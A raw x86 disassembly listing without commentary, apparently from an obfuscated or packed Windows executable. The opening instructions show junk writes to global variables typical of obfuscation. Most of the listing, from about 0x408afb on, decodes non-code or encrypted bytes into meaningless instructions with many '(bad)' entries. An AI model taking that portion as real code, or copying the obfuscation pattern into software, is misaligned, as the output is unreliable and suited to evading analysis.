  4089da:	mov    DWORD PTR [ebp-0x34],ecx
  4089dd:	mov    DWORD PTR ds:0x426f05,0x15
  4089e7:	cmp    DWORD PTR ds:0x426f05,0x0
  4089ee:	je     0x408a3a
  4089f4:	cmp    DWORD PTR ds:0x426f05,0x6
  4089fb:	jle    0x408a3a
  408a01:	jmp    0x408a0f
  408a06:	push   DWORD PTR [ebp-0x28]
  408a09:	call   DWORD PTR ds:0x430a28
  408a0f:	cmp    DWORD PTR ds:0x426f05,0x7
  408a16:	jne    0x408a2a
  408a1c:	xor    eax,eax
  408a1e:	xor    eax,DWORD PTR ds:0x426f05
  408a24:	dec    eax
  408a25:	mov    ds:0x426f05,eax
  408a2a:	mov    eax,ds:0x426f05
  408a2f:	dec    eax
  408a30:	mov    ds:0x426f05,eax
  408a35:	jmp    0x4089e7
  408a3a:	mov    eax,DWORD PTR [ebp-0x14]
  408a3d:	or     ecx,0x6017
  408a43:	mov    ecx,DWORD PTR [ebp+0x8]
  408a46:	sbb    DWORD PTR ds:0x426e9d,0x426f29
  408a50:	add    ecx,DWORD PTR [eax+0x1c]
  408a53:	mov    DWORD PTR ds:0x426e89,0x71b1
  408a5d:	mov    DWORD PTR [ebp-0x14],ecx
  408a60:	jmp    0x408ae1
  408a65:	mov    ecx,DWORD PTR ds:0x426ee1
  408a6b:	or     DWORD PTR ds:0x426f29,ecx
  408a71:	mov    eax,DWORD PTR [ebp-0x2c]
  408a74:	mov    ecx,DWORD PTR [ebp+0x8]
  408a77:	add    ecx,DWORD PTR [eax+ebx*4]
  408a7a:	add    eax,DWORD PTR ds:0x426f11
  408a80:	mov    DWORD PTR [ebp-0x28],ecx
  408a83:	mov    eax,DWORD PTR [ebp-0x4]
  408a86:	mov    ecx,DWORD PTR [ebp-0x28]
  408a89:	xor    eax,esi
  408a8b:	add    eax,edi
  408a8d:	mov    DWORD PTR ds:0x426eb5,0x5328
  408a97:	cmp    ecx,eax
  408a99:	je     0x408ae1
  408a9f:	mov    DWORD PTR ds:0x426f0d,0x30c
  408aa9:	jmp    0x408ad2
  408aae:	mov    eax,DWORD PTR [ebp-0x4]
  408ab1:	mov    ecx,DWORD PTR [ebp-0x8]
  408ab4:	xor    eax,esi
  408ab6:	add    eax,edi
  408ab8:	cmp    ecx,eax
  408aba:	mov    eax,DWORD PTR [ebp-0x4]
  408abd:	je     0x40aed1
  408ac3:	mov    ecx,DWORD PTR [ebp-0x30]
  408ac6:	xor    eax,esi
  408ac8:	add    eax,edi
  408aca:	cmp    ecx,eax
  408acc:	je     0x40aeda
  408ad2:	lea    eax,[ebp-0x8]
  408ad5:	push   eax
  408ad6:	push   DWORD PTR [ebp-0x28]
  408ad9:	push   DWORD PTR [ebp+0xc]
  408adc:	call   0x411c13
  408ae1:	mov    eax,DWORD PTR [ebp-0x4]
  408ae4:	mov    ecx,DWORD PTR [ebp-0x8]
  408ae7:	xor    eax,esi
  408ae9:	add    eax,edi
  408aeb:	cmp    ecx,eax
  408aed:	je     0x40aebd
  408af3:	mov    eax,DWORD PTR [ebp-0x34]
  408af6:	jmp    0x40aeab
  408afb:	cwde   
  408afc:	mov    esi,0x78f950e9
  408b01:	cmp    BYTE PTR [esi+0x12],al
  408b04:	mov    ds:0xb04f29ff,eax
  408b09:	dec    ecx
  408b0a:	and    al,0xea
  408b0c:	in     eax,0x7b
  408b0e:	jnp    0x408b23
  408b10:	pushf  
  408b11:	jnp    0x408b8e
  408b13:	push   esi
  408b14:	dec    esi
  408b15:	in     al,dx
  408b16:	or     eax,DWORD PTR ds:0x2db20cc
  408b1c:	or     al,0xd2
  408b1e:	lods   al,BYTE PTR ds:[esi]
  408b1f:	mov    al,0x69
  408b21:	cwde   
  408b22:	cli    
  408b23:	xchg   edx,eax
  408b24:	adc    eax,0x8a3373d0
  408b29:	in     eax,dx
  408b2a:	(bad)  
  408b2b:	jmp    0x8fb3c733
  408b30:	xchg   edx,eax
  408b31:	mov    ds:0x7fbafb51,eax
  408b36:	rcr    DWORD PTR [ecx],0xfd
  408b39:	ret    0xac4
  408b3c:	pushf  
  408b3d:	or     BYTE PTR [esi+0x13595cdb],0xe0
  408b44:	dec    ebx
  408b45:	fist   DWORD PTR ds:0xea980e44
  408b4b:	or     eax,0x2c783a1c
  408b50:	push   esi
  408b51:	push   0x1a115373
  408b56:	adc    BYTE PTR [ebx-0x31953c35],ch
  408b5c:	sub    BYTE PTR [ecx-0x6e],0x30
  408b60:	sbb    BYTE PTR [edx+0x1cb66057],0xd5
  408b67:	in     eax,dx
  408b68:	mov    ebx,0x83c975d7
  408b6d:	xor    BYTE PTR [ecx],bl
  408b6f:	cmp    ecx,DWORD PTR [ebp-0x10d4bc1f]
  408b75:	(bad)  
  408b76:	aaa    
  408b77:	test   eax,0xf86b924b
  408b7c:	mov    dh,0x92
  408b7e:	and    DWORD PTR fs:[edx],0x57
  408b82:	je     0x408be1
  408b84:	lock iret 
  408b86:	jg     0x408b3a
  408b88:	add    edx,edx
  408b8a:	mov    esi,0x27a9e8bc
  408b8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b90:	mov    al,0x5a
  408b92:	nop
  408b93:	jge    0x408bca
  408b95:	fwait
  408b96:	add    esi,DWORD PTR [edx+0x70]
  408b99:	cwde   
  408b9a:	jge    0x408ba3
  408b9c:	jnp    0x408b44
  408b9e:	popa   
  408b9f:	push   ebp
  408ba0:	xor    dl,BYTE PTR [edx-0x5c01a69b]
  408ba6:	fwait
  408ba7:	lods   al,BYTE PTR ds:[esi]
  408ba8:	jae    0x408b9b
  408baa:	xor    BYTE PTR [ebx-0x19],dh
  408bad:	clc    
  408bae:	adc    DWORD PTR [ecx],ebx
  408bb0:	mov    ?,ebp
  408bb2:	push   ecx
  408bb3:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  408bb5:	jecxz  0x408bc7
  408bb7:	stc    
  408bb8:	cmp    BYTE PTR [eax+ebp*2],ch
  408bbb:	mov    ch,0x26
  408bbd:	hlt    
  408bbe:	and    al,0x4c
  408bc0:	out    0x4f,al
  408bc2:	ins    BYTE PTR es:[edi],dx
  408bc3:	add    al,0x6c
  408bc5:	call   0x4659:0x7c199aa5
  408bcc:	sti    
  408bcd:	add    BYTE PTR [eax],ah
  408bcf:	xor    DWORD PTR [ecx+ebx*1+0x1b9715ab],eax
  408bd6:	mov    ds:0xfc30c2c8,eax
  408bdb:	je     0x408bbb
  408bdd:	xor    ebx,edx
  408bdf:	and    edx,DWORD PTR [ecx]
  408be1:	jno    0x408c3d
  408be3:	retf   
  408be4:	add    dl,BYTE PTR [ebp-0x712d5907]
  408bea:	pop    ecx
  408beb:	jno    0x408c64
  408bed:	adc    al,0x6c
  408bef:	dec    ebp
  408bf0:	out    0x9a,al
  408bf2:	leave  
  408bf3:	inc    edx
  408bf4:	mov    esp,0x69855fe
  408bf9:	stos   DWORD PTR es:[edi],eax
  408bfa:	mov    ecx,0xc5668a3e
  408bff:	inc    ecx
  408c00:	push   ds
  408c01:	cwde   
  408c02:	sti    
  408c03:	mov    esp,DWORD PTR [esi+0x5672174e]
  408c09:	pop    edx
  408c0a:	stos   DWORD PTR es:[edi],eax
  408c0b:	sti    
  408c0c:	mov    bl,0x5b
  408c0e:	push   ss
  408c0f:	imul   eax,DWORD PTR [eax],0x8c32716
  408c15:	shl    edx,0x65
  408c18:	imul   esp,DWORD PTR [eax],0xd1cf3a67
  408c1e:	pop    esi
  408c1f:	xchg   ebx,eax
  408c20:	or     cl,dh
  408c22:	test   BYTE PTR [eax],dh
  408c24:	jmp    0xc6ae:0x28105f8d
  408c2b:	mov    BYTE PTR [edi-0x69],dl
  408c2e:	adc    al,0x6
  408c30:	int    0x32
  408c32:	mov    cl,0xa7
  408c34:	inc    edi
  408c35:	mov    ecx,0xa563eea2
  408c3a:	mov    esi,0x4fed355
  408c3f:	mov    ah,0x67
  408c41:	sti    
  408c42:	xchg   esp,eax
  408c43:	push   0xffffffeb
  408c45:	jl     0x408c67
  408c47:	out    0xbc,eax
  408c49:	xor    cl,BYTE PTR [edi-0x20]
  408c4c:	push   ebp
  408c4d:	mov    al,ds:0x8bc5fb45
  408c52:	adc    DWORD PTR [esi-0xd1a3f46],edx
  408c58:	into   
  408c59:	out    dx,eax
  408c5a:	push   ss
  408c5b:	shl    DWORD PTR [ecx-0x4],1
  408c5e:	jnp    0x408c0e
  408c60:	jo     0x408c46
  408c62:	sbb    al,0x49
  408c64:	(bad)  
  408c65:	jmp    0x408c6a
  408c67:	xchg   esi,eax
  408c68:	call   0xdc2e47e3
  408c6d:	scas   al,BYTE PTR es:[edi]
  408c6e:	test   BYTE PTR [bx+si-0x2d46],bh
  408c73:	jp     0x408c27
  408c75:	xor    DWORD PTR [esi+0x10825642],0xffffffbe
  408c7c:	shl    DWORD PTR [edx-0x3ffe8f90],1
  408c82:	int3   
  408c83:	test   DWORD PTR [eax+0x4f],ecx
  408c86:	sbb    DWORD PTR [edx],0xe7a04123
  408c8c:	lock test bh,dh
  408c8f:	xor    al,0x76
  408c91:	jecxz  0x408c13
  408c93:	sub    BYTE PTR [ebx],ah
  408c95:	(bad)  
  408c96:	ror    DWORD PTR ds:0xc51cc14b,1
  408c9c:	push   esp
  408c9d:	or     eax,0xd49374f1
  408ca2:	push   0x15
  408ca4:	add    ah,bl
  408ca6:	into   
  408ca7:	pop    edx
  408ca8:	call   0x3776:0x93eed20
  408caf:	mov    bl,0xad
  408cb1:	jecxz  0x408d04
  408cb3:	data16 fist DWORD PTR [ebx]
  408cb6:	and    DWORD PTR [ecx+0x6a],ebp
  408cb9:	xor    ebp,DWORD PTR [edx]
  408cbb:	mov    ds,WORD PTR [ebp-0x44018096]
  408cc1:	aaa    
  408cc2:	retf   
  408cc3:	stc    
  408cc4:	pop    ebx
  408cc5:	ret    0xe051
  408cc8:	or     eax,0x1eacf8a4
  408ccd:	xchg   ebx,eax
  408cce:	mul    BYTE PTR [edi+0x52]
  408cd1:	(bad)  
  408cd2:	xchg   ebp,eax
  408cd3:	xchg   ecx,eax
  408cd4:	int    0x33
  408cd6:	mov    ebx,0x41de8260
  408cdb:	push   edi
  408cdc:	test   DWORD PTR [edx-0x5b678ad8],esi
  408ce2:	loop   0x408d11
  408ce4:	xchg   edi,eax
  408ce5:	push   ds
  408ce6:	fst    QWORD PTR [esi+0x1d]
  408ce9:	dec    ecx
  408cea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ceb:	mov    ds:0x8e083a93,eax
  408cf0:	(bad)  
  408cf1:	test   eax,0x85d492b9
  408cf6:	mov    eax,ds:0xf134486c
  408cfb:	sti    
  408cfc:	push   ecx
  408cfd:	inc    eax
  408cfe:	outs   dx,DWORD PTR ds:[esi]
  408cff:	daa    
  408d00:	mov    ebx,0xf0edfa65
  408d05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d06:	sub    eax,DWORD PTR ds:0x7de0fe05
  408d0c:	mov    gs,WORD PTR [edi+0x25]
  408d0f:	jecxz  0x408c9b
  408d11:	jg     0x408ca7
  408d13:	out    0xff,eax
  408d15:	mov    al,ds:0xf70b2579
  408d1a:	pop    ds
  408d1b:	outs   dx,DWORD PTR ds:[esi]
  408d1c:	scas   al,BYTE PTR es:[edi]
  408d1d:	xor    DWORD PTR [eax],edi
  408d1f:	loop   0x408cb4
  408d21:	push   edx
  408d22:	sub    eax,0x88006ce4
  408d27:	fistp  DWORD PTR [ebx-0x1e]
  408d2a:	pop    edi
  408d2b:	call   0x1f8d:0xd7fa5f39
  408d32:	lea    esp,[ecx-0x69]
  408d35:	jmp    0x408cde
  408d37:	lds    esp,FWORD PTR [edx+ebx*2-0x26]
  408d3b:	popa   
  408d3c:	or     al,0xed
  408d3e:	inc    eax
  408d3f:	push   ebx
  408d40:	mov    edx,0x4a598331
  408d45:	(bad)  
  408d46:	sub    al,0xce
  408d48:	mov    cl,0xa6
  408d4a:	or     cl,al
  408d4c:	sub    DWORD PTR [esi],ebx
  408d4e:	add    al,0x71
  408d50:	(bad)  
  408d51:	in     eax,0xf2
  408d53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d54:	sti    
  408d55:	or     BYTE PTR [esi-0x52],cl
  408d58:	ret    
  408d59:	into   
  408d5a:	enter  0xbb3f,0xbf
  408d5e:	into   
  408d5f:	sub    ah,BYTE PTR fs:[edi+0x4d62ce0c]
  408d66:	sub    dl,bh
  408d68:	mov    al,ds:0x225526b3
  408d6d:	cdq    
  408d6e:	xchg   esp,eax
  408d6f:	hlt    
  408d70:	xor    DWORD PTR [esi-0x42ec55f1],ebx
  408d76:	cmp    eax,0x929ccf85
  408d7b:	bound  ecx,QWORD PTR [ecx]
  408d7d:	xchg   edi,eax
  408d7e:	dec    esi
  408d7f:	xor    al,BYTE PTR [edx-0x11]
  408d82:	cwde   
  408d83:	addr16 repz add al,0x5b
  408d87:	loop   0x408d14
  408d89:	movhps xmm6,QWORD PTR [ecx]
  408d8c:	mov    WORD PTR [esi],gs
  408d8e:	enter  0x92c6,0x7f
  408d92:	rcl    BYTE PTR [esi-0x22178fd3],1
  408d98:	(bad)  
  408d9a:	add    esi,DWORD PTR [esi]
  408d9c:	cmp    al,0xb1
  408d9e:	xchg   DWORD PTR [eax+0x3a],ebx
  408da1:	sub    bh,BYTE PTR [eax]
  408da3:	mov    ds:0xf42b159c,eax
  408da8:	loop   0x408e04
  408daa:	mov    al,ds:0xae500e62
  408daf:	aas    
  408db0:	int3   
  408db1:	fwait
  408db2:	push   esi
  408db3:	mov    cs,WORD PTR [esi]
  408db5:	adc    BYTE PTR [edx],dl
  408db7:	jle    0x408dce
  408db9:	jo     0x408d7f
  408dbb:	add    BYTE PTR [esi-0x5b],ah
  408dbe:	fisttp DWORD PTR [esi+0x2f]
  408dc1:	xchg   edi,eax
  408dc2:	sbb    DWORD PTR [ebp-0x2f],eax
  408dc5:	fisubr DWORD PTR [edi]
  408dc7:	jmp    FWORD PTR [edx-0x11]
  408dca:	(bad)  
  408dcb:	das    
  408dcc:	or     al,0xda
  408dce:	lahf   
  408dcf:	je     0x408e4e
  408dd1:	inc    ebx
  408dd2:	xchg   esp,eax
  408dd3:	pop    ss
  408dd4:	dec    ebp
  408dd5:	hlt    
  408dd6:	test   al,0x57
  408dd8:	nop
  408dd9:	out    0x14,eax
  408ddb:	loopne 0x408db8
  408ddd:	test   BYTE PTR [edi-0x49],0xb2
  408de1:	and    al,0x9a
  408de3:	xchg   ecx,eax
  408de4:	and    edx,edx
  408de6:	fwait
  408de7:	iret   
  408de8:	je     0x408db2
  408dea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408deb:	jo     0x408e2e
  408ded:	out    dx,eax
  408dee:	fistp  WORD PTR [ebp-0x2ff072c4]
  408df4:	bound  edx,QWORD PTR [bp-0x12]
  408df8:	test   eax,0x402c4b84
  408dfd:	out    0x33,eax
  408dff:	jo     0x408e5c
  408e01:	ret    0xc027
  408e04:	stc    
  408e05:	enter  0xb8d5,0xb2
  408e09:	sub    DWORD PTR [ebx+0x21],ebp
  408e0c:	aaa    
  408e0d:	mov    al,ds:0x116b1813
  408e12:	or     DWORD PTR [edx+0x1253c6d9],ebx
  408e18:	test   dh,dh
  408e1a:	xchg   esp,eax
  408e1b:	aas    
  408e1c:	pop    ebp
  408e1d:	pushf  
  408e1e:	mov    esp,0x1ed4fa1f
  408e23:	loopne 0x408e28
  408e25:	xchg   BYTE PTR [edi-0x61],dl
  408e28:	in     al,dx
  408e29:	inc    edx
  408e2a:	pop    esi
  408e2b:	xchg   ebx,eax
  408e2c:	push   0xffffffad
  408e2e:	loope  0x408e29
  408e30:	mov    al,ds:0xd45e07e9
  408e35:	bound  edx,QWORD PTR [esi]
  408e37:	hlt    
  408e38:	ds xor al,0xf8
  408e3b:	pop    ebp
  408e3c:	out    dx,al
  408e3d:	xchg   edx,eax
  408e3e:	or     DWORD PTR [edi],eax
  408e40:	dec    esp
  408e41:	rcl    BYTE PTR [edi+0x4c199788],cl
  408e47:	sub    al,BYTE PTR [ebx-0x48]
  408e4a:	sbb    al,0x0
  408e4c:	test   eax,0x73dd55e
  408e51:	pop    ds
  408e52:	cmp    cl,BYTE PTR [ecx+esi*8-0x4]
  408e56:	int3   
  408e57:	inc    eax
  408e58:	(bad)  
  408e5a:	xchg   ebp,eax
  408e5b:	add    dh,BYTE PTR [ebx-0x3faa1bfa]
  408e61:	mov    eax,0x3c49c10d
  408e66:	pop    ds
  408e67:	popf   
  408e68:	fisubr WORD PTR ds:0xe0efe587
  408e6f:	mov    dl,BYTE PTR [edx]
  408e71:	cmp    DWORD PTR [eax-0x13],ebx
  408e74:	cli    
  408e75:	or     DWORD PTR [eax+eax*4-0x78],esi
  408e79:	dec    ebp
  408e7a:	or     BYTE PTR [ebx+ecx*1-0x5a],bh
  408e7e:	in     eax,dx
  408e7f:	xchg   DWORD PTR [eax+0x1b23b5e7],esp
  408e85:	out    dx,eax
  408e86:	push   es
  408e87:	out    dx,al
  408e88:	push   edi
  408e89:	xchg   sp,ax
  408e8b:	add    DWORD PTR [eax+ebp*1+0x56a92863],ebx
  408e92:	mov    ebp,0x7545a42e
  408e97:	fdivrp st(6),st
  408e99:	jle    0x408ee9
  408e9b:	hlt    
  408e9c:	push   0xffffffc8
  408e9e:	pushf  
  408e9f:	ret    
  408ea0:	xor    edi,DWORD PTR [esi]
  408ea2:	push   0xf9015014
  408ea7:	les    esp,FWORD PTR ss:[edx-0x22cca8c6]
  408eae:	arpl   ax,di
  408eb0:	cwde   
  408eb1:	or     DWORD PTR [edi-0x7734616c],eax
  408eb7:	xchg   ebx,eax
  408eb8:	iret   
  408eb9:	push   ebp
  408eba:	aas    
  408ebb:	stc    
  408ebc:	mov    al,0xa4
  408ebe:	sub    DWORD PTR [si],ebx
  408ec1:	rcr    BYTE PTR [ebx-0x68968c4b],cl
  408ec7:	inc    ecx
  408ec8:	pop    ds
  408ec9:	retf   
  408eca:	mov    ?,WORD PTR [ebp-0x263758b4]
  408ed0:	push   ebx
  408ed1:	sub    BYTE PTR [eax-0x27],dh
  408ed4:	add    DWORD PTR [esi],ecx
  408ed6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ed7:	jns    0x408ef3
  408ed9:	xor    al,0x6d
  408edb:	pop    ebx
  408edc:	dec    esi
  408edd:	adc    eax,0x7a57cf7
  408ee2:	xchg   esi,eax
  408ee3:	repnz int 0x32
  408ee6:	mov    ds:0xb6348729,eax
  408eeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408eec:	fcom   DWORD PTR [edi]
  408eee:	sbb    BYTE PTR [edi+0x11cc7da3],cl
  408ef4:	adc    BYTE PTR [ecx-0x339d9028],0xea
  408efb:	js     0x408ec6
  408efd:	xor    BYTE PTR [edx+edi*8+0x3e],ch
  408f01:	mov    BYTE PTR [esi],ah
  408f03:	inc    edi
  408f04:	fsubr  st(6),st
  408f06:	shl    eax,cl
  408f08:	jmp    FWORD PTR [ebx-0x60]
  408f0b:	mov    BYTE PTR gs:[edi+0x6d],0x10
  408f10:	cmp    DWORD PTR [esi+0x3c],0x6e25392e
  408f17:	into   
  408f18:	mov    bl,BYTE PTR [ecx]
  408f1a:	out    dx,al
  408f1b:	dec    edi
  408f1c:	clc    
  408f1d:	xchg   ebx,eax
  408f1e:	push   ecx
  408f1f:	xchg   DWORD PTR [ebx+0x62],ecx
  408f22:	mov    edx,0x7fb2b60f
  408f27:	mov    dh,0xde
  408f29:	pushf  
  408f2a:	sahf   
  408f2b:	(bad)  
  408f2c:	jle    0x408faa
  408f2e:	and    ah,bh
  408f30:	push   ecx
  408f31:	outs   dx,BYTE PTR ds:[esi]
  408f32:	sti    
  408f33:	(bad)  
  408f34:	call   0xb7d854f5
  408f39:	xor    al,0x5a
  408f3b:	mov    al,ds:0x3efd1336
  408f40:	sbb    BYTE PTR [edi+ebx*8+0x44],dl
  408f44:	sbb    ebp,DWORD PTR [ebx+0x35c1ede5]
  408f4a:	xchg   DWORD PTR [eax+0x41254f9a],ebp
  408f50:	lods   eax,DWORD PTR ds:[esi]
  408f51:	pop    ecx
  408f52:	or     cl,BYTE PTR [ecx-0x6c]
  408f55:	xchg   esi,edi
  408f57:	into   
  408f58:	mov    ch,0xfc
  408f5a:	add    DWORD PTR [ecx+0x1940f36],0x77
  408f61:	into   
  408f62:	pop    eax
  408f63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f64:	pop    ss
  408f65:	stos   BYTE PTR es:[edi],al
  408f66:	test   BYTE PTR [eax-0x2a],ah
  408f69:	or     esp,DWORD PTR [esi+0x3e]
  408f6c:	pop    edi
  408f6d:	sbb    al,0x24
  408f6f:	xor    eax,0x6495c2a0
  408f74:	jno    0x408f75
  408f76:	xor    BYTE PTR [ebx],ch
  408f78:	loopne 0x408f96
  408f7a:	(bad)  
  408f7b:	mov    ds:0x8b48d16e,eax
  408f80:	sbb    al,BYTE PTR [esi-0x5f6a0c93]
  408f86:	jmp    0xd6d0e5e2
  408f8b:	test   DWORD PTR [ecx+0x1f545550],edi
  408f91:	and    edi,ecx
  408f93:	xor    BYTE PTR [ebx],ch
  408f95:	mov    dh,0x65
  408f97:	aas    
  408f98:	cmp    edx,eax
  408f9a:	mov    ecx,0xff2ca44f
  408f9f:	xor    dl,dl
  408fa1:	or     eax,0x300ac7ae
  408fa6:	aas    
  408fa7:	fld    TBYTE PTR [ecx]
  408fa9:	iret   
  408faa:	xor    al,BYTE PTR [esi-0x28]
  408fad:	out    0xc7,al
  408faf:	test   BYTE PTR [ebp-0x691b76b9],ah
  408fb5:	mov    ebx,0x24a1bc2b
  408fba:	pop    ebp
  408fbb:	out    dx,al
  408fbc:	jnp    0x408f40
  408fbe:	rol    DWORD PTR [edi],1
  408fc0:	aam    0x3a
  408fc2:	imul   eax,ecx,0xffffffc8
  408fc5:	sub    ecx,DWORD PTR [edi+esi*2]
  408fc8:	les    esi,FWORD PTR [edi]
  408fca:	lea    esp,[eax+0x79]
  408fcd:	scas   eax,DWORD PTR es:[edi]
  408fce:	xor    BYTE PTR [edx-0x39],0xa8
  408fd2:	nop
  408fd3:	test   al,0xe7
  408fd5:	sbb    BYTE PTR [ebx],al
  408fd7:	xchg   esp,eax
  408fd8:	inc    edx
  408fd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fda:	mov    esp,0xa61f26ba
  408fdf:	test   eax,0xbaf64209
  408fe4:	jg     0x40900c
  408fe6:	jmp    0x43a17a78
  408feb:	aad    0xce
  408fed:	inc    ecx
  408fee:	or     al,dh
  408ff0:	ror    BYTE PTR [bp+si],1
  408ff3:	in     eax,dx
  408ff4:	jmp    FWORD PTR [ebx]
  408ff6:	aaa    
  408ff7:	enter  0x127a,0xf6
  408ffb:	ficom  DWORD PTR [ebp-0x729b254c]
  409001:	xor    ebx,esp
  409003:	sbb    cl,bh
  409005:	mov    dh,0xc
  409007:	sub    DWORD PTR [edx],ecx
  409009:	pop    esi
  40900a:	call   0xa11e4a4e
  40900f:	sub    edx,ecx
  409011:	push   ebx
  409012:	xor    eax,0x38fe73c
  409017:	mov    al,ds:0xe14225bd
  40901c:	loopne 0x408ff6
  40901e:	pusha  
  40901f:	sbb    eax,0x88a4f645
  409024:	cmp    al,0xf8
  409026:	or     ebp,esp
  409028:	iret   
  409029:	inc    ebx
  40902a:	push   esi
  40902b:	shl    BYTE PTR [edx-0x2e2cc86a],1
  409031:	scas   eax,DWORD PTR es:[edi]
  409032:	sub    dh,BYTE PTR [edi+0x22]
  409035:	mov    ah,0x55
  409037:	stos   DWORD PTR es:[edi],eax
  409038:	push   edi
  409039:	jns    0x409084
  40903b:	push   ss
  40903c:	mov    eax,0xc66a90d3
  409042:	js     0x40902f
  409044:	inc    edx
  409045:	dec    ecx
  409046:	pop    esp
  409047:	adc    DWORD PTR [edx+0x65],edi
  40904a:	lods   al,BYTE PTR ds:[esi]
  40904b:	test   eax,0xe1b3fb1f
  409050:	test   eax,0xca51db38
  409055:	fsubr  DWORD PTR [edi+ebp*4]
  409058:	or     DWORD PTR [edx+0x79b6338e],ebx
  40905e:	fidiv  WORD PTR [bx+si-0x239f]
  409063:	push   ss
  409064:	ret    
  409065:	xor    eax,0xde3ef20e
  40906a:	call   0xbc4d1249
  40906f:	bound  ebx,QWORD PTR [ecx+0x6d]
  409072:	aam    0xeb
  409074:	mov    ebx,0xeaee6b8f
  409079:	sbb    BYTE PTR [ebp+0x15],ah
  40907c:	mov    eax,0x14909d18
  409081:	aas    
  409082:	jmp    0x69ba:0x1b1571d6
  409089:	fidiv  WORD PTR [ebp+0x1dc74c75]
  40908f:	iret   
  409090:	hlt    
  409091:	loopne 0x409055
  409093:	dec    eax
  409094:	lahf   
  409095:	jmp    0x5f2d:0x2c9d88e4
  40909c:	or     DWORD PTR [esi+0x38],0x6308de04
  4090a3:	jmp    0xc531:0xabf033bc
  4090aa:	push   es
  4090ab:	cmp    ebx,DWORD PTR [ecx+0xb1cdf97]
  4090b1:	inc    eax
  4090b2:	adc    DWORD PTR [edi],ecx
  4090b4:	dec    esi
  4090b5:	cmp    bl,0x1c
  4090b8:	outs   dx,DWORD PTR ds:[esi]
  4090b9:	xchg   esi,eax
  4090ba:	les    edx,FWORD PTR [eax]
  4090bc:	inc    ebx
  4090bd:	lods   eax,DWORD PTR ds:[esi]
  4090be:	jb     0x40909e
  4090c0:	out    0xa0,eax
  4090c2:	daa    
  4090c3:	cmp    BYTE PTR [ecx+0x54],dl
  4090c6:	pop    esp
  4090c7:	pop    edi
  4090c8:	out    0x35,al
  4090ca:	xlat   BYTE PTR ds:[ebx]
  4090cb:	push   esi
  4090cc:	stos   DWORD PTR es:[edi],eax
  4090cd:	or     al,0x85
  4090cf:	enter  0xc061,0xb
  4090d3:	out    dx,eax
  4090d4:	jle    0x4090ed
  4090d6:	xchg   esi,eax
  4090d7:	mov    al,ds:0xe2c90a54
  4090dc:	ret    0xe9a1
  4090df:	cwde   
  4090e0:	inc    ecx
  4090e1:	xchg   edx,eax
  4090e2:	cs mov dh,0xf2
  4090e5:	or     DWORD PTR [eax+0x5f7ce79a],eax
  4090eb:	ror    DWORD PTR [edx-0x4a2d4ea3],0x18
  4090f2:	add    BYTE PTR [edx-0x4f],0x69
  4090f6:	ret    0x9549
  4090f9:	lods   eax,DWORD PTR ds:[esi]
  4090fa:	push   ecx
  4090fb:	push   edx
  4090fc:	hlt    
  4090fd:	add    dl,BYTE PTR [ebx]
  4090ff:	or     bl,dh
  409101:	or     eax,0xc225d57e
  409106:	pop    esp
  409107:	dec    edi
  409108:	xchg   esi,eax
  409109:	add    eax,0x48567183
  40910e:	push   esp
  40910f:	cmp    bh,ah
  409111:	mov    DWORD PTR [eax-0x3cf1cc6a],ebp
  409117:	sti    
  409118:	(bad)  
  409119:	jno    0x40910c
  40911b:	dec    edi
  40911c:	xor    BYTE PTR [edi+0x42858005],ah
  409122:	clc    
  409123:	dec    esp
  409124:	in     al,dx
  409125:	je     0x4090f8
  409127:	arpl   WORD PTR [ebx+esi*8-0x624a954],bx
  40912e:	mov    ds:0xf83bc8a0,eax
  409133:	pop    eax
  409134:	add    eax,0x20d8103
  409139:	and    dl,BYTE PTR [ecx+0x56]
  40913c:	mov    esi,0xc60ef6aa
  409141:	repz jne 0x4090cd
  409144:	int3   
  409145:	adc    al,dh
  409147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409148:	imul   ebx,DWORD PTR [ecx+0x3c],0x17911257
  40914f:	inc    eax
  409150:	out    0x3c,eax
  409152:	add    bh,BYTE PTR [ebx]
  409154:	xlat   BYTE PTR ds:[ebx]
  409155:	mov    bl,0x22
  409157:	(bad)  
  409158:	push   ds
  409159:	js     0x409171
  40915b:	lods   al,BYTE PTR ds:[esi]
  40915c:	inc    esi
  40915d:	fstp   st(6)
  40915f:	mov    BYTE PTR [edi-0x61cfa5a6],al
  409165:	int3   
  409166:	pop    esp
  409167:	inc    edx
  409168:	(bad)  
  409169:	lods   al,BYTE PTR ds:[esi]
  40916a:	ret    0x82c2
  40916d:	lds    esp,FWORD PTR [edi-0x546ee307]
  409173:	mov    DWORD PTR [eax],esi
  409175:	jmp    0x4090f9
  409177:	int    0xee
  409179:	cmp    al,0x47
  40917b:	push   0x36
  40917d:	and    al,0x1b
  40917f:	push   0x76
  409181:	jb     0x409152
  409183:	mov    bl,0xd0
  409185:	popf   
  409186:	mov    eax,0x84e51882
  40918b:	jge    0x409147
  40918d:	push   ebx
  40918e:	int3   
  40918f:	int    0x6f
  409191:	or     ah,ah
  409193:	pop    eax
  409194:	mov    ah,BYTE PTR ds:0x4386886c
  40919a:	ds (bad) 
  40919c:	je     0x4091c8
  40919e:	nop
  40919f:	ins    DWORD PTR es:[edi],dx
  4091a0:	daa    
  4091a1:	out    dx,eax
  4091a2:	and    al,0x28
  4091a4:	loope  0x409151
  4091a6:	repnz fnsave [eax]
  4091a9:	jl     0x40914a
  4091ab:	enter  0x1254,0xe6
  4091af:	ds jp  0x4091c1
  4091b2:	scas   al,BYTE PTR es:[edi]
  4091b3:	(bad)
  4091b6:	shr    BYTE PTR [ebp-0x4ba7959d],0xd7
  4091bd:	lock jl 0x40919c
  4091c0:	mov    ebx,0x496acfa9
  4091c5:	jo     0x40917a
  4091c7:	ret    0xbbec
  4091ca:	dec    esi
  4091cb:	push   0x7a95f30c
  4091d0:	sbb    ebx,ebx
  4091d2:	xchg   DWORD PTR [eax-0x58],ecx
  4091d5:	cmp    bl,BYTE PTR [edx]
  4091d7:	and    al,0x13
  4091d9:	xor    edx,DWORD PTR [esi]
  4091db:	cmp    eax,0x304e299a
